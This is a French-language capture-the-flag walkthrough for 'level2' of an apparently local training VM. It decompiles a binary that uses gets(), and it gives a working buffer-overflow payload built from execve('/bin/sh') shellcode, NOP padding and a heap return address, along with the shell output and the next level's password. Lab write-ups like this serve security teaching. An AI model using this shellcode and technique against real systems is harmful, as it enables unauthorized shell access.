# LEVEL 2
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level3`. 

1. Une fois connecté à la VM sur le `level2`, l'on retrouve un fichier `level2` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

    ```sh
    > scp -P 4242 level2@127.0.0.1:level2 /path/on/machine/host
    ```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>
	#include <unistd.h>
	#include <sys/types.h>

	int p(void)
	{
		unsigned int unaff_retaddr;
		char local_50[76];

		fflush(stdout);
		gets(local_50);

		if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
			printf("(%p)\n", unaff_retaddr);
			return EXIT_FAILURE;
		}

		puts(local_50);
		strdup(local_50);

		return EXIT_SUCCESS;
	}

	int main(void)
	{
		return p();
	}
	```
	
    À partir de ce désassemblage, on en déduit que le programme contient 2 fonctions : la fonction `main` et la fonction `p` qui, tout deux, ne prennent aucun paramètre.

	La fonction `main` appelle tout simplement la fonction `p` tandis que la fonction `p` lit des entrées utilisateur dans `local_50` en utilisant la fonction `gets` et vérifie si `unaff_retaddr` a une partie spécifique définie. Si c'est le cas, elle imprime `unaff_retaddr` et termine le programme. Sinon, la fonction `p` utilise `puts` pour imprimer `local_50` et `strdup` pour allouer de la mémoire pour `local_50`.

	Comme dans le niveau inférieur, ce code est vulnérable à une attaque de dépassement de tampon en raison de l'utilisation de `gets`, mais comporte tout de même une détection d'attaque potentielle que l'on va devoir by-pass.

3. Après cette recherche, l'on peut trouver un code shellcraft spécifiquement utilisé pour exploiter des vulnérabilités sur la fonctions `gets`. Plus précisément, le shellcode ci-dessous permet d'effectuer un appel système pour exécuter `/bin/sh` et de terminer ensuite le processus avec un code de sortie 1. Cela permettrait d'exécuter un shell interactif et pouvoir obtenir le mot de passe pour le niveau suivant.

    Code shellcraft : 
    ```sh
	"\x31\xc0\x50\x68\x2f\x2f\x73"
	"\x68\x68\x2f\x62\x69\x6e\x89"
	"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	"\xcd\x80\x31\xc0\x40\xcd\x80"
	```

	Lien : https://shell-storm.org/shellcode/files/shellcode-811.html

4. De fait, nous allons générer une chaine de charactère que l'on stock dans `/tmp/payload2`. Cette chaîne de caractère contient en premier lieu le code shellcraft mentionné ci-dessus, `52 octets` de NOP (no-operation) qui garantissent que l'adresse écraser est correctement alignée ainsi que l'adresse mémoire `0x0804a008` en format little endian du `malloc` utilisé dans `strdup` (trouvé en utilisant `gdb` sur l'exécutable `level2`).
    
	```sh
	> python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90" * 52 + "\x08\xa0\x04\x08"' > /tmp/payload2
	```

5. En suite, l'on va utiliser la chaîne de caractère précédemment généré afin d'exploiter les vulnérabilités de l'exécutable `level2`. En exploitant `level2`, on remplace ainsi l'adresse de retour par le code shellcraft, nous permettant d'ouvrir un shell interactif et pouvoir obtenir le mot de passe pour le niveau suivant (au passage, on lance la commande `whoami` pour s'assurer que l'utilisateur a bien changé de `level2` à `level3`).
    
	```sh
	> cat /tmp/payload2 - | ./level2
	> whoami
	level3
	> cat /home/user/level3/.pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
	```

6. On peut à présent passer au niveau supérieur en exécutant la commande `su level3` et en y spécifiant le mot de passe qui vient d'être trouvée. 

    ```sh
    > su level3
    Password : 
	> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
    ```



